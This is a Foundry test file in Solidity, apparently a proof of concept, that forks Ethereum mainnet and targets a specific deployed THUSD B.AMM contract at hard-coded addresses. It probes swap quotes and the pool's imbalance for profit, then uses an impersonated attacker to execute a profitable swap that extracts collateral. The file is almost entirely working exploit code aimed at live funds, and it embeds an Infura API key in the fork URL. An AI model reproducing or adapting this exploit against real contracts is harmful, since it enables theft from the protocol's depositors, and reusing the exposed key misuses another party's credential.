// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBAMM {
    function deposit(uint256 thusdAmount) external;
    function withdraw(uint256 numShares) external;
    function swap(uint256 thusdAmount, uint256 minCollateralReturn, address payable dest) external returns(uint);
    function getSwapCollateralAmount(uint256 thusdQty) external view returns(uint256 collateralAmount, uint256 feeTHUSDAmount);
    function getCollateralBalance() external view returns (uint256);
    function fetchPrice() external view returns(uint256);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function SP() external view returns (address);
    function thusdToken() external view returns (address);
    function collateralERC20() external view returns (address);
    function A() external view returns (uint256);
    function fee() external view returns (uint256);
    function maxDiscount() external view returns (uint256);
}

interface IStabilityPool {
    function getCompoundedTHUSDDeposit(address) external view returns (uint256);
    function getDepositorCollateralGain(address) external view returns (uint256);
}

contract RealBAMMExploit is Test {
    address constant THUSD = 0xCFC5bD99915aAa815401C5a41A927aB7a38d29cf;
    address constant ACTUAL_BAMM = 0x920623AcBa785ED9a70d33ACab53631e1e834675;
    address constant PCV_CONTROLLER = 0x097f1ee62E63aCFC3Bf64c1a61d96B3771dd06cB;

    uint256 constant PRECISION = 1e18;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function testReadRealBAMMState() public view {
        console.log("====================================================");
        console.log("READING ACTUAL BAMM STATE");
        console.log("====================================================");

        IBAMM bamm = IBAMM(ACTUAL_BAMM);

        console.log("\n--- Basic State ---");

        // Try to read all state variables
        try bamm.A() returns (uint256 A) {
            console.log("Amplification A:", A);
        } catch {
            console.log("A: FAILED");
        }

        try bamm.fee() returns (uint256 fee) {
            console.log("Fee (bps):", fee);
        } catch {
            console.log("fee: FAILED");
        }

        try bamm.maxDiscount() returns (uint256 maxDiscount) {
            console.log("Max Discount (bps):", maxDiscount);
        } catch {
            console.log("maxDiscount: FAILED");
        }

        try bamm.SP() returns (address sp) {
            console.log("Stability Pool:", sp);

            // Read SP state
            IStabilityPool stabilityPool = IStabilityPool(sp);

            try stabilityPool.getCompoundedTHUSDDeposit(ACTUAL_BAMM) returns (uint256 thusdDeposit) {
                console.log("THUSD in SP:", thusdDeposit / 1e18);
            } catch {
                console.log("SP THUSD: FAILED");
            }

            try stabilityPool.getDepositorCollateralGain(ACTUAL_BAMM) returns (uint256 collGain) {
                console.log("Collateral Gain:", collGain / 1e18);
            } catch {
                console.log("Coll Gain: FAILED");
            }
        } catch {
            console.log("SP: FAILED");
        }

        try bamm.fetchPrice() returns (uint256 price) {
            console.log("ETH Price:", price / 1e18);
        } catch {
            console.log("fetchPrice: FAILED");
        }

        try bamm.getCollateralBalance() returns (uint256 collBal) {
            console.log("Total Collateral:", collBal / 1e18);
        } catch {
            console.log("getCollateralBalance: FAILED");
        }

        try bamm.totalSupply() returns (uint256 supply) {
            console.log("Total Shares:", supply);
        } catch {
            console.log("totalSupply: FAILED");
        }
    }

    function testCheckSwapQuote() public view {
        console.log("====================================================");
        console.log("CHECKING SWAP QUOTE FOR PROFIT");
        console.log("====================================================");

        IBAMM bamm = IBAMM(ACTUAL_BAMM);

        // Try different swap amounts
        uint256[] memory amounts = new uint256[](6);
        amounts[0] = 1e18;        // 1 THUSD
        amounts[1] = 100e18;      // 100 THUSD
        amounts[2] = 1000e18;     // 1K THUSD
        amounts[3] = 10000e18;    // 10K THUSD
        amounts[4] = 100000e18;   // 100K THUSD
        amounts[5] = 1000000e18;  // 1M THUSD

        uint256 price = 0;
        try bamm.fetchPrice() returns (uint256 p) {
            price = p;
        } catch {}

        for (uint i = 0; i < amounts.length; i++) {
            try bamm.getSwapCollateralAmount(amounts[i]) returns (uint256 collOut, uint256 feeOut) {
                console.log("\nSwap:", amounts[i] / 1e18, "THUSD");
                console.log("Collateral out:", collOut);
                console.log("Fee:", feeOut);

                if (price > 0) {
                    uint256 collUsdValue = collOut * price / PRECISION;
                    console.log("Collateral USD value:", collUsdValue / 1e18);

                    if (collUsdValue > amounts[i]) {
                        uint256 profit = collUsdValue - amounts[i];
                        console.log("*** PROFIT:", profit / 1e18, "USD ***");
                        console.log("*** ROI:", profit * 100 / amounts[i], "% ***");
                    }
                }
            } catch {
                console.log("\nSwap:", amounts[i] / 1e18, "THUSD - FAILED");
            }
        }
    }

    function testCalculatePoolRatio() public view {
        console.log("====================================================");
        console.log("CALCULATING POOL RATIO FOR EXPLOIT");
        console.log("====================================================");

        IBAMM bamm = IBAMM(ACTUAL_BAMM);

        // Get pool balances
        uint256 thusdBalance = 0;
        uint256 collateralBalance = 0;
        uint256 price = 0;

        try bamm.SP() returns (address sp) {
            try IStabilityPool(sp).getCompoundedTHUSDDeposit(ACTUAL_BAMM) returns (uint256 thusd) {
                thusdBalance = thusd;
            } catch {}

            try IStabilityPool(sp).getDepositorCollateralGain(ACTUAL_BAMM) returns (uint256 coll) {
                collateralBalance += coll;
            } catch {}
        } catch {}

        try bamm.getCollateralBalance() returns (uint256 coll) {
            collateralBalance = coll;
        } catch {}

        try bamm.fetchPrice() returns (uint256 p) {
            price = p;
        } catch {}

        console.log("THUSD in pool:", thusdBalance / 1e18);
        console.log("Collateral in pool:", collateralBalance / 1e18);
        console.log("ETH Price:", price / 1e18);

        if (thusdBalance > 0 && price > 0) {
            uint256 collateralUsdValue = collateralBalance * price / PRECISION;
            console.log("Collateral USD value:", collateralUsdValue / 1e18);

            // Calculate virtual y
            uint256 yBalance = thusdBalance + (collateralUsdValue * 2);
            console.log("Virtual Y:", yBalance / 1e18);

            uint256 ratio = yBalance * 100 / thusdBalance;
            console.log("Y/X Ratio:", ratio, "%");

            // Based on our analysis:
            // Ratio 100% -> ~0% profit
            // Ratio 200% -> ~8% profit
            // Ratio 300% -> ~20% profit
            // Ratio 500% -> ~71% profit

            if (ratio > 100) {
                console.log("\n*** POTENTIAL EXPLOIT! ***");
                console.log("Pool is imbalanced with ratio:", ratio, "%");

                // Estimate profit
                uint256 estimatedProfit = 0;
                if (ratio >= 500) {
                    estimatedProfit = 71;
                } else if (ratio >= 300) {
                    estimatedProfit = 20;
                } else if (ratio >= 200) {
                    estimatedProfit = 8;
                }
                console.log("Estimated profit per swap:", estimatedProfit, "%");
            }
        }
    }

    function testExecuteExploit() public {
        console.log("====================================================");
        console.log("ATTEMPTING EXPLOIT EXECUTION");
        console.log("====================================================");

        IBAMM bamm = IBAMM(ACTUAL_BAMM);

        // Find a THUSD whale
        // Check PCV Controller which has 50M THUSD
        uint256 pcvBalance = IERC20(THUSD).balanceOf(PCV_CONTROLLER);
        console.log("PCV Controller THUSD:", pcvBalance / 1e18);

        // Check THUSD total supply to find whales
        uint256 totalSupply = IERC20(THUSD).totalSupply();
        console.log("THUSD Total Supply:", totalSupply / 1e18);

        // Try to get swap quote first
        uint256 attackAmount = 10000e18; // 10K THUSD

        try bamm.getSwapCollateralAmount(attackAmount) returns (uint256 collOut, uint256 feeOut) {
            console.log("\nSwap Quote for 10K THUSD:");
            console.log("Collateral out:", collOut);
            console.log("Fee:", feeOut);

            uint256 price = bamm.fetchPrice();
            uint256 collUsdValue = collOut * price / PRECISION;
            console.log("Collateral USD value:", collUsdValue / 1e18);

            if (collUsdValue > attackAmount) {
                console.log("\n*** PROFITABLE SWAP DETECTED! ***");
                console.log("Input:", attackAmount / 1e18, "THUSD");
                console.log("Output:", collUsdValue / 1e18, "USD");
                console.log("Profit:", (collUsdValue - attackAmount) / 1e18, "USD");

                // Now try to execute
                // Need to find THUSD to use
                // Try to deal ourselves some THUSD
                address attacker = makeAddr("attacker");
                deal(THUSD, attacker, attackAmount);

                vm.startPrank(attacker);
                IERC20(THUSD).approve(ACTUAL_BAMM, type(uint256).max);

                uint256 ethBefore = attacker.balance;

                try bamm.swap(attackAmount, 1, payable(attacker)) returns (uint256 received) {
                    uint256 ethAfter = attacker.balance;
                    console.log("\n*** EXPLOIT SUCCESSFUL! ***");
                    console.log("Received collateral:", received);
                    console.log("ETH gained:", ethAfter - ethBefore);
                    console.log("ETH value:", (ethAfter - ethBefore) * price / PRECISION / 1e18);
                } catch Error(string memory reason) {
                    console.log("Swap failed:", reason);
                } catch {
                    console.log("Swap failed with unknown error");
                }

                vm.stopPrank();
            } else {
                console.log("No profit in current state");
            }
        } catch {
            console.log("getSwapCollateralAmount failed");
        }
    }
}
